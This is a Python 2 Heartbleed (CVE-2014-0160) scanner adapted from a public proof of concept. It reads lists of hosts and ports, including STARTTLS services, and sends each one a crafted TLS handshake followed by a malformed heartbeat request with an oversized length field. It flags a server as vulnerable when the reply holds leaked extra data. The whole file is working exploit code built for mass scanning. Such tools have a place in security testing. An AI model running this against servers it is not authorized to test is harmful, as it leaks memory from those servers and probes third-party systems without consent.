#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

# Quickly and dirtily modified by Mustafa Al-Bassam (mus@musalbas.com) to test
# the Alexa top X.

# Made things prettier and added port list functionality

import sys
import struct
import socket
import time
import select
import re
import random
from collections import defaultdict
from argparse import ArgumentParser


# Recognized STARTTLS modes
starttls_modes = ["smtp", "pop3", "imap", "ldap", "xmpp"]


# Set up REs to detect ports on IPv4 and IPv6 addresses as well as STARTTLS modes
portrangere = re.compile("^(?P<start>[\d+]*)(-(?P<end>[\d+]*))?$")
ipv4re      = re.compile("^(?P<host>[^:]*?)(:(?P<port>\d+))?$")
ipv6re      = re.compile("^(([[](?P<bracketedhost>[\dA-Fa-f:]*?)[]])|(?P<host>[^:]*?))(:(?P<port>\d+))?$")
starttlsre  = re.compile("^(?P<port>\d+)/(?P<mode>(" + ")|(".join(starttls_modes) + "))$", re.I)


# Set up dicts to store some counters and config flags
counter_nossl   = defaultdict(int)
counter_notvuln = defaultdict(int)
counter_vuln    = defaultdict(int)
starttls_modes  = defaultdict(str)


# Parse args
parser = ArgumentParser()
parser.add_argument("-c", "--concise",    dest="concise",   default=None,                 action="store_true",  help="make output concise")
parser.add_argument("-4", "--ipv4",       dest="ipv4",      default=True,                 action="store_true",  help="turn on IPv4 scans (default)")
parser.add_argument("-6", "--ipv6",       dest="ipv6",      default=True,                 action="store_true",  help="turn on IPv6 scans (default)")
parser.add_argument(      "--no-ipv4",    dest="ipv4",                                    action="store_false", help="turn off IPv4 scans")
parser.add_argument(      "--no-ipv6",    dest="ipv6",                                    action="store_false", help="turn off IPv6 scans")
parser.add_argument(      "--no-summary", dest="summary",   default=True,                 action="store_false", help="suppress scan summary")
parser.add_argument("-t", "--timestamp",  dest="timestamp", const="%Y-%m-%dT%H:%M:%S%z:", nargs="?",            help="add timestamps to output; optionally takes format string (default: '%%Y-%%m-%%dT%%H:%%M:%%S%%z:')")
parser.add_argument(      "--starttls",   dest="starttls",  const="25/smtp, 110/pop3, 143/imap, 389/ldap, 5222/xmpp, 5269/xmpp", default ="", nargs="?", help="insert proper protocol stanzas to initiate STARTTLS (default: '25/smtp, 110/pop3, 143/imap, 389/ldap, 5222/xmpp, 5269/xmpp')")
parser.add_argument("-p", "--ports",      dest="ports",     action="append",              nargs=1,              help="list of ports to be scanned (default: 443)")
parser.add_argument("-l", "--length",     dest="length",    default=0x4000,               type=int,             help="heartbeat request length field")
parser.add_argument("-H", "--hosts",      dest="hosts",     default=False,                action="store_true",  help="turn off hostlist processing, process host names directly instead")
parser.add_argument("hostlist",                             default=["-"],                nargs="*",            help="list(s) of hosts to be scanned (default: stdin)")
args = parser.parse_args()

# Parse port list specification
portlist = []
tmplist = []
if not args.ports:
    args.ports = [["443"]]
for port in args.ports:
    portlist.extend(port[0].replace(",", " ").replace(";", " ").split())
for port in portlist:
    match = portrangere.match(str(port))
    if not match:
        sys.exit("ERROR: Invalid port specification: " + port)
    if match.group("end"):
        tmplist.extend(range(int(match.group("start")), int(match.group("end")) + 1))
    else:
        tmplist.append(int(match.group("start")))
portlist = list(set([i for i in tmplist]))
portlist.sort()


# Parse STARTTLS mode specification
tmplist = args.starttls.replace(",", " ").replace(";", " ").split()
for starttls in tmplist:
    match = starttlsre.match(starttls)
    if not match:
        sys.exit("ERROR: Invalid STARTTLS specification: " + starttls)
    starttls_modes[int(match.group("port"))] = match.group("mode").lower()


# Define nice xstr function that converts None to ""
xstr = lambda s: s or ""


def get_ipv4_address(host):
    try:
        address = socket.getaddrinfo(host, None, socket.AF_INET, 0, socket.SOL_TCP)
    except socket.error:  # not a valid address
        return False
    return address[0][4][0]


def get_ipv6_address(host):
    try:
        address = socket.getaddrinfo(host, None, socket.AF_INET6, 0, socket.SOL_TCP)
    except socket.error:  # not a valid address
        return False
    return address[0][4][0]


def h2bin(x):
    x = re.sub(r'#.*$', r'', x, flags=re.MULTILINE)
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello_pre = h2bin('''
        16          # type
        03 02       # version
        00 dc       # len
        01          # type
        00 00 d8    # len
        03 02       # version
        ''')

hello_post = h2bin('''
        # session id
        00          # len

        # cipher suites
        00 66       # len   102 = 51 suites
        c0 14
        c0 0a
        c0 22
        c0 21
        00 39
        00 38
        00 88
        00 87
        c0 0f
        c0 05
        00 35
        00 84
        c0 12
        c0 08
        c0 1c
        c0 1b
        00 16
        00 13
        c0 0d
        c0 03
        00 0a
        c0 13
        c0 09
        c0 1f
        c0 1e
        00 33
        00 32
        00 9a
        00 99
        00 45
        00 44
        c0 0e
        c0 04
        00 2f
        00 96
        00 41
        c0 11
        c0 07
        c0 0c
        c0 02
        00 05
        00 04
        00 15
        00 12
        00 09
        00 14
        00 11
        00 08
        00 06
        00 03
        00 ff

        # compressors
        01          # len
        00

        # extensions
        00 49       # len

        # ext: ec point formats
        00 0b       # type
        00 04       # len
        03          # len
        00
        01
        02

        # ext: elliptic curves
        00 0a       # type
        00 34       # len
        00 32       # len
        00 0e
        00 0d
        00 19
        00 0b
        00 0c
        00 18
        00 09
        00 0a
        00 16
        00 17
        00 08
        00 06
        00 07
        00 14
        00 15
        00 04
        00 05
        00 12
        00 13
        00 01
        00 02
        00 03
        00 0f
        00 10
        00 11

        # ext: session ticket
        00 23       # type
        00 00       # len

        # ext: heartbeat
        00 0f       # type
        00 01       # len
        01          # peer_allowed_to_send
        ''')

def create_clienthello():
    return  hello_pre + \
            struct.pack('>L', time.time()) + \
            struct.pack('>7L',              random.getrandbits(32),
                    random.getrandbits(32), random.getrandbits(32),
                    random.getrandbits(32), random.getrandbits(32),
                    random.getrandbits(32), random.getrandbits(32)) + \
            hello_post

def create_hb_req(version, length):
    return h2bin('18') + struct.pack('>H', version) + \
        h2bin('00 03 01') + struct.pack('>H', length)

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        #print '  %04x: %-48s %s' % (b, hxdat, pdat)
    #print

recv_buffer = ''

def recvall(s, length, timeout=5):
    global recv_buffer
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        if len(recv_buffer)>0:
            d = recv_buffer[:remain]
            remain -= len(d)
            rdata += d
            recv_buffer = recv_buffer[len(d):]
        if remain==0:
            return rdata
        rtime = endtime - time.time()
        if rtime < 0:
            if len(rdata)>0:
                return rdata
            else:
                return None
        r, w, e = select.select([s], [], [], 1)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                if len(rdata)>0:
                    return rdata
                else:
                    return None
            recv_buffer += data
    return rdata

def hit_hb(s, hb):
    s.send(hb)
    while True:
        typ, ver, pay, done = recv_sslrecord(s)
        if typ is None:
            #print 'No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            #print 'Received heartbeat response:'
            #hexdump(pay)
            if len(pay) > 3:
                #print 'WARNING: server returned more data than it should - server is vulnerable!'
                return True
            else:
                #print 'Server processed malformed heartbeat, but did not return any extra data.'
                return False

        if typ == 21:
            #print 'Received alert:'
            #hexdump(pay)
            #print 'Server returned error, likely not vulnerable'
            return False


def do_starttls(s, mode):
    if mode == "smtp":
        # receive greeting
        recvall(s, 1024)
        # send EHLO
        s.send("EHLO heartbleed-scanner.example.com\r\n")
        # receive capabilities
        cap = s.recv(1024)
        #print cap
        if 'STARTTLS' in cap:
            # start STARTTLS
            s.send("STARTTLS\r\n")
            ack = s.recv(1024)
            if "220" in ack:
                return True
#    elif mode == "imap":
#        # receive greeting
#        s.recv(1024)
#        # start STARTTLS
#        s.send("a001 STARTTLS\r\n")
#        # receive confirmation
#        if "a001 OK" in s.recv(1024):
#            return True
#        else:
#            return False
#    elif mode == "pop3":
#        # receive greeting
#        s.recv(1024)
#        # STARTTLS 
#        s.send("STLS\r\n")
#        if "+OK" in s.recv(1024):
#            return True
#        else:
#            return False
    return False

def parse_handshake(buf):
    remaining = len(buf)
    skip = 0
    while remaining > 0:
        if remaining < 4:
            #print 'Length mismatch; unable to parse SSL handshake'
            return False
        typ = ord(buf[skip])
        highbyte, msglen = struct.unpack_from('>BH', buf, skip + 1)
        msglen += highbyte * 0x10000
        if typ == 14:
            #print 'server hello done'
            return True
        remaining -= (msglen + 4)
        skip += (msglen + 4)
    return False

def recv_sslrecord(s):
    hdr = recvall(s, 5, 5)
    if hdr is None:
        return None, None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        #print 'No payload received; server closed connection'
        return None, None, None, None
    if typ == 22:
        server_hello_done = parse_handshake(pay)
    else:
        server_hello_done = None
    return typ, ver, pay, server_hello_done

def is_vulnerable(domain, port, protocol):
    global recv_buffer
    recv_buffer = ''
    s = socket.socket(protocol, socket.SOCK_STREAM)
    s.settimeout(2)
    #print 'Connecting...'
    #sys.stdout.flush()
    try:
        s.connect((domain, port))
    except Exception, e:
        return None
    #print 'Sending Client Hello...'
    #sys.stdout.flush()
    if starttls_modes[port]:
        do_starttls(s, starttls_modes[port])
    s.send(create_clienthello())
    #print 'Waiting for Server Hello...'
    #sys.stdout.flush()
    version = None
    while True:
        typ, ver, pay, done = recv_sslrecord(s)
        if typ == None:
            #print 'Server closed connection without sending Server Hello.'
            return None
        version = ver
        # Look for server hello done message.
        if typ == 22 and done:
            break

    #print 'Sending heartbeat request...'
    #sys.stdout.flush()
    return hit_hb(s, create_hb_req(version, args.length))


def scan_address(domain, address, protocol, portlist):
    if args.timestamp:
        print time.strftime(args.timestamp, time.gmtime()),
    if not args.concise:
        print "Testing " + domain + " (" + address + ")... ",
    else:
        print domain + " (" + address + ")",

    for port in portlist:
        sys.stdout.flush();
        result = is_vulnerable(address, port, protocol);
        if result is None:
            if not args.concise:
                print "port " + str(port) + ": no SSL/unreachable;",
            else:
                print str(port) + "-",
            counter_nossl[port] += 1;
        elif result:
            if not args.concise:
                print "port " + str(port) + ": VULNERABLE!",
            else:
                print str(port) + "!",
            counter_vuln[port] += 1;
        else:
            if not args.concise:
                print "port " + str(port) + ": not vulnerable;",
            else:
                print str(port) + "+",
            counter_notvuln[port] += 1;
    print ""


def scan_host(domain):
    if args.ipv4:
        match = ipv4re.match(domain)
        if match:
            hostname = xstr(match.group("host"))
            address = get_ipv4_address(hostname)
            if address:
                if match.group("port"):
                    scan_address(hostname, address, socket.AF_INET, [int(match.group("port"))])
                else:
                    scan_address(hostname, address, socket.AF_INET, portlist)

    if args.ipv6:
        match = ipv6re.match(domain)
        if match:
            hostname = xstr(match.group("bracketedhost")) + xstr(match.group("host"))
            address = get_ipv6_address(hostname)
            if address:
                if match.group("port"):
                    scan_address(hostname, address, socket.AF_INET6, [int(match.group("port"))])
                else:
                    scan_address(hostname, address, socket.AF_INET6, portlist)


def main():
    if args.hosts:
        for input in args.hostlist:
            scan_host(input)
    else:
        for input in args.hostlist:
            if input == "-":
                for line in sys.stdin:
                    scan_host(line.strip())
            else:
                file = open(input, 'r')
                for line in file:
                    scan_host(line.strip())
                file.close()

    if args.summary:
        print
        print "- no SSL/unreachable: " + str(sum(counter_nossl.values())) + " (" + "; ".join(["port " + str(port) + ": " + str(counter_nossl[port]) for port in sorted(counter_nossl.keys())]) + ")"
        print "! VULNERABLE: " + str(sum(counter_vuln.values())) + " (" + "; ".join(["port " + str(port) + ": " + str(counter_vuln[port]) for port in sorted(counter_vuln.keys())]) + ")"
        print "+ not vulnerable: " + str(sum(counter_notvuln.values())) + " (" + "; ".join(["port " + str(port) + ": " + str(counter_notvuln[port]) for port in sorted(counter_notvuln.keys())]) + ")"


if __name__ == '__main__':
    main()
